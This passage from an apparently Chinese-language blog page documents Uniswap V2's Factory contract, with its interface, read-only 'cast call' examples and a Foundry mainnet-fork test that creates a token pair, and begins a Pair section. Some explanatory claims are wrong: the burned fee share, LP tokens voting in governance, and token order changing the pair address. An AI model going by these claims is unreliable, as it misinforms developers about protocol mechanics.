id=&#34;facotry&#34;&gt;&lt;span&gt;Facotry&lt;/span&gt;&#xA;  &lt;a href=&#34;#facotry&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;a href=&#34;https://docs.uniswap.org/contracts/v2/reference/smart-contracts/factory&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://docs.uniswap.org/contracts/v2/reference/smart-contracts/factory&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;在 Uniswap 协议中，Factory 是指 Uniswap 的工厂合约，它是创建 Uniswap 市场的主要合约。它的作用是充当中央化的市场制造商，允许任何人在 Uniswap 上创建自己的交易对，例如 ETH/DAI 或 USDC/DAI 等。&lt;/p&gt;&#xA;&lt;p&gt;当一个用户想要创建一个新的交易对时，他们会将资产添加到 Liquidity Pool 中，这个过程会触发 Factory 合约，Factory 合约会根据输入的两种资产类型的地址创建一个新的交易对，并将 Liquidity Pool 添加到新创建的交易对中。Factory 合约还负责为每个新的交易对创建对应的交易对合约，以便交易对的交易可以被执行。&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;地址&#34;&gt;&lt;span&gt;地址&lt;/span&gt;&#xA;  &lt;a href=&#34;#%e5%9c%b0%e5%9d%80&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;&lt;a href=&#34;https://etherscan.io/address/0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f#code&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;接口&#34;&gt;&lt;span&gt;接口&lt;/span&gt;&#xA;  &lt;a href=&#34;#%e6%8e%a5%e5%8f%a3&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;import &amp;#39;@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;import IUniswapV2Factory from &amp;#39;@uniswap/v2-core/build/IUniswapV2Factory.json&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;pragma solidity &amp;gt;=0.5.0;&#xA;&#xA;interface IUniswapV2Factory {&#xA;  event PairCreated(address indexed token0, address indexed token1, address pair, uint);&#xA;&#xA;  function getPair(address tokenA, address tokenB) external view returns (address pair);&#xA;  function allPairs(uint) external view returns (address pair);&#xA;  function allPairsLength() external view returns (uint);&#xA;&#xA;  function feeTo() external view returns (address);&#xA;  function feeToSetter() external view returns (address);&#xA;&#xA;  function createPair(address tokenA, address tokenB) external returns (address pair);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;&#xA;&lt;p&gt;下面所有的举例都假设你设置了 ETH_RPC_URL=&lt;mainnet&gt; 环境变量&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;h5 class=&#34;heading-element&#34; id=&#34;event-paircreated&#34;&gt;&lt;span&gt;event PairCreated&lt;/span&gt;&#xA;  &lt;a href=&#34;#event-paircreated&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h5&gt;&lt;pre&gt;&lt;code&gt;event PairCreated(address indexed token0, address indexed token1, address pair, uint);&lt;/code&gt;&lt;/pre&gt;&lt;h5 class=&#34;heading-element&#34; id=&#34;allpairs&#34;&gt;&lt;span&gt;allPairs&lt;/span&gt;&#xA;  &lt;a href=&#34;#allpairs&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h5&gt;&lt;p&gt;获取第N个交易对&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function allPairs(uint) external view returns (address pair);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;举例:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;# 返回第1个pair的地址: 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc&#xA;cast call 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f  &amp;#34;allPairs(uint)(address)&amp;#34; 0&#xA;&#xA;# 返回pair的token0的地址: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48&#xA;cast call 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc &amp;#34;token0()(address)&amp;#34; &#xA;&#xA;# 返回token0名称: USD Coin&#xA;cast call 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48 &amp;#34;name()(string)&amp;#34;&#xA;&#xA;# 返回pair的token1的地址: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2&#xA;cast call 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc &amp;#34;token1()(address)&amp;#34;&#xA;&#xA;# 返回token1名称: Wrapped Ether&#xA;cast call 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2  &amp;#34;name()(string)&amp;#34;&#xA;&#xA;# 所以第一个交易对是 USD Coin 和 Wrapped Ether&lt;/code&gt;&lt;/pre&gt;&lt;h5 class=&#34;heading-element&#34; id=&#34;getpair&#34;&gt;&lt;span&gt;getPair&lt;/span&gt;&#xA;  &lt;a href=&#34;#getpair&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h5&gt;&lt;p&gt;传入token1和token2地址, 查询对应的pair地址 (不存在返回0x0)&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function getPair(address tokenA, address tokenB) external view returns (address pair);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;举例:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;# 比如查询 DAI-USDC交易对对应的Pair&#xA;# DAI: 0x6B175474E89094C44Da98b954EedeAC495271d0F&#xA;# USDC: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48&#xA;# 返回: 0xAE461cA67B15dc8dc81CE7615e0320dA1A9aB8D5&#xA;cast call 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f &amp;#34;getPair(address,address)(address)&amp;#34; 0x6B175474E89094C44Da98b954EedeAC495271d0F  0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48&lt;/code&gt;&lt;/pre&gt;&lt;h5 class=&#34;heading-element&#34; id=&#34;allpairslength&#34;&gt;&lt;span&gt;allPairsLength&lt;/span&gt;&#xA;  &lt;a href=&#34;#allpairslength&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h5&gt;&lt;p&gt;返回pair总数&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function allPairsLength() external view returns (uint);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;举例&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;# 返回 150745&#xA;cast call 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f  &amp;#34;allPairsLength()(uint)&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;h5 class=&#34;heading-element&#34; id=&#34;feeto&#34;&gt;&lt;span&gt;feeTo&lt;/span&gt;&#xA;  &lt;a href=&#34;#feeto&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h5&gt;&lt;p&gt;手续费收取人地址.&lt;/p&gt;&#xA;&lt;p&gt;当用户在 Uniswap 上进行交易时，交易所收取的费用将被分成两部分：一部分将被直接销毁（burn），另一部分将被分配给 &lt;code&gt;feeTo&lt;/code&gt; 函数指定的地址。销毁的部分是为了保证 Uniswap 协议中的流动性资产总量不会因为手续费的积累而增加，而分配给 &lt;code&gt;feeTo&lt;/code&gt; 函数指定的地址的部分则可以被用于奖励交易所，例如支付给开发者或用于项目运营等。&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function feeToSetter() external view returns (address);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;目前 feeTo的地址是0x0&lt;/p&gt;&#xA;&lt;p&gt;参考这里:  &lt;a href=&#34;https://docs.uniswap.org/contracts/v2/concepts/advanced-topics/fees#protocol-charge-calculation&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://docs.uniswap.org/contracts/v2/concepts/advanced-topics/fees#protocol-charge-calculation&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h5 class=&#34;heading-element&#34; id=&#34;feetosetter&#34;&gt;&lt;span&gt;feeToSetter&lt;/span&gt;&#xA;  &lt;a href=&#34;#feetosetter&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h5&gt;&lt;pre&gt;&lt;code&gt;function feeToSetter() external view returns (address);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;获取可以更新feeTo地址的地址 (The address allowed to change &lt;a href=&#34;https://docs.uniswap.org/contracts/v2/reference/smart-contracts/factory#feeto&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;feeTo&lt;/a&gt;.)&lt;/p&gt;&#xA;&lt;h5 class=&#34;heading-element&#34; id=&#34;createpair&#34;&gt;&lt;span&gt;createPair&lt;/span&gt;&#xA;  &lt;a href=&#34;#createpair&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h5&gt;&lt;p&gt;创建Pair. (Creates a pair for &lt;code&gt;tokenA&lt;/code&gt; and &lt;code&gt;tokenB&lt;/code&gt; if one doesn&amp;rsquo;t exist already.)&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;创建时tokenA和tokenB的传入顺序是由影响的, 因为Pair的地址是这样计算的&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;        address pairAddress2 = address(&#xA;            uint160(&#xA;                (&#xA;                    uint(&#xA;                        keccak256(&#xA;                            abi.encodePacked(&#xA;                                hex&amp;#34;ff&amp;#34;,&#xA;                                factory,&#xA;                                keccak256(abi.encodePacked(tokenA, tokenB)),&#xA;                                hex&amp;#34;96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f&amp;#34;&#xA;                            )&#xA;                        )&#xA;                    )&#xA;                )&#xA;            )&#xA;        );&lt;/code&gt;&lt;/pre&gt;&lt;/blockquote&gt;&#xA;&lt;pre&gt;&lt;code&gt;function createPair(address tokenA, address tokenB) external returns (address pair);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;举例:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// SPDX-License-Identifier: SEE LICENSE IN LICENSE&#xA;pragma solidity ^0.8.10;&#xA;&#xA;import &amp;#34;forge-std/Test.sol&amp;#34;;&#xA;// forge install OpenZeppelin/openzeppelin-contracts --no-commit&#xA;import &amp;#34;lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol&amp;#34;;&#xA;// forge install --no-commit  Uniswap/v2-core&#xA;import &amp;#34;lib/v2-core/contracts/interfaces/IUniswapV2Factory.sol&amp;#34;;&#xA;import &amp;#34;lib/v2-core/contracts/interfaces/IUniswapV2Pair.sol&amp;#34;;&#xA;&#xA;address constant UNISWAP_V2_FACTORY_ADDRESS = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;&#xA;address constant USDT_ADDRESS = 0xdAC17F958D2ee523a2206206994597C13D831ec7;&#xA;&#xA;contract ExampleToken is ERC20 {&#xA;    constructor(&#xA;        string memory _name,&#xA;        string memory _symbol&#xA;    ) ERC20(_name, _symbol) {&#xA;        uint256 initSupply = 100 * 10 ** decimals();&#xA;        _mint(msg.sender, initSupply);&#xA;    }&#xA;}&#xA;&#xA;contract CreatePairTest is Test {&#xA;    IUniswapV2Factory facotry;&#xA;    ExampleToken ext;&#xA;    IERC20 usdt;&#xA;&#xA;    function setUp() public {&#xA;        //[rpc_endpoints]&#xA;        //mainnet = &amp;#34;${ETH_RPC_URL}&amp;#34;&#xA;        vm.createSelectFork(&amp;#34;mainnet&amp;#34;);&#xA;&#xA;        facotry = IUniswapV2Factory(UNISWAP_V2_FACTORY_ADDRESS);&#xA;        usdt = IERC20(USDT_ADDRESS);&#xA;        ext = new ExampleToken(&amp;#34;EXAMPLE&amp;#34;, &amp;#34;EXT&amp;#34;);&#xA;    }&#xA;&#xA;    function testCreatePair() public {&#xA;        uint pairLengthBefore = facotry.allPairsLength();&#xA;        console2.log(&amp;#34;pair length before:&amp;#34;, facotry.allPairsLength());&#xA;        address pairAddress = facotry.createPair(address(ext), address(usdt));&#xA;        console2.log(&amp;#34;pair address:&amp;#34;, pairAddress);&#xA;        IUniswapV2Pair pair = IUniswapV2Pair(pairAddress);&#xA;        console2.log(&#xA;            ERC20(pair.token0()).symbol(),&#xA;            &amp;#34;-&amp;#34;,&#xA;            ERC20(pair.token1()).symbol()&#xA;        );&#xA;        uint pairLengthAfter = facotry.allPairsLength();&#xA;        console2.log(&amp;#34;pair length after:&amp;#34;, facotry.allPairsLength());&#xA;        assert(pairLengthAfter == pairLengthBefore &amp;#43; 1);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;输出&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;[PASS] testCreatePair() (gas: 2518336)&#xA;Logs:&#xA;  pair length before: 150948&#xA;  pair address: 0xEC42F3DDD5940F2be204938e6b0C70fC72c4aE85&#xA;  EXT - USDT&#xA;  pair length after: 150949&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;pair&#34;&gt;&lt;span&gt;Pair&lt;/span&gt;&#xA;  &lt;a href=&#34;#pair&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;a href=&#34;https://docs.uniswap.org/contracts/v2/reference/smart-contracts/pair&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://docs.uniswap.org/contracts/v2/reference/smart-contracts/pair&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;在Uniswap中，Pair是指一对代币的交易池，用于交换这两种代币。Uniswap的交易池采用自动做市商模型（Automated Market Maker，AMM），也就是说，它们通过智能合约自动确定代币的价格，而不是依赖于传统的买卖订单簿。&lt;/p&gt;&#xA;&lt;p&gt;每个Pair都有一个唯一的地址，由代币的合约地址计算而来。例如，在ETH/USDT交易对中，ETH和USDT的代币合约地址会被组合成一个新的地址，该地址就是Pair的地址。&lt;/p&gt;&#xA;&lt;p&gt;每个Pair中都会存储相应代币的余额和汇率，汇率是指一个代币相对于另一个代币的价格比率。当用户在一个Pair中进行交易时，他们会把一种代币发送到该Pair的智能合约地址，智能合约会自动计算出相应的汇率，然后返回等值的另一种代币。&lt;/p&gt;&#xA;&lt;p&gt;当用户在Uniswap上创建一个新的交易对时，会通过调用Factory合约的createPair函数来创建新的Pair。createPair函数会将两个代币的合约地址作为输入参数，并使用这些地址来计算Pair的地址。创建成功后，该Pair将被添加到Uniswap中，并且用户就可以在该Pair中进行交易了。&lt;/p&gt;&#xA;&lt;p&gt;每个Pair都有一个自己的代币，称为LP代币或流动性代币（Liquidity Provider Token）。当一个用户向Pair中提供流动性时，他们会收到相应数量的LP代币，这些代币代表用户向交易池中贡献的流动性。&lt;/p&gt;&#xA;&lt;p&gt;LP代币可以用于多种用途。首先，用户可以随时将其赎回，以取回相应的流动性。此外，LP代币也可以用于投票和治理，例如，在Uniswap的治理中，持有LP代币的用户可以投票表决关于Uniswap协议的决策。最后，用户还可以将其LP代币质押到各种流动性挖矿平台上，以获取代币的奖励。&lt;/p&gt;&#xA;&lt;p&gt;LPs(流动性提供商)可以通过向池子里添加代币来赚取交易费，以获得LP代币的奖励&lt;/p&gt;&#xA;&lt;p&gt;需要注意的是，每个Pair的LP代币是独立的，不同的交易对将有不同的LP代币。此外，LP代币的价值是根据Pair中存储的代币余额和汇率来计算的，因此它们的价值会随着Pair中代币余额和价格的变化而变化。&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;地址-1&#34;&gt;&lt;span&gt;地址&lt;/span&gt;&#xA;  &lt;a href=&#34;#%e5%9c%b0%e5%9d%80-1&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 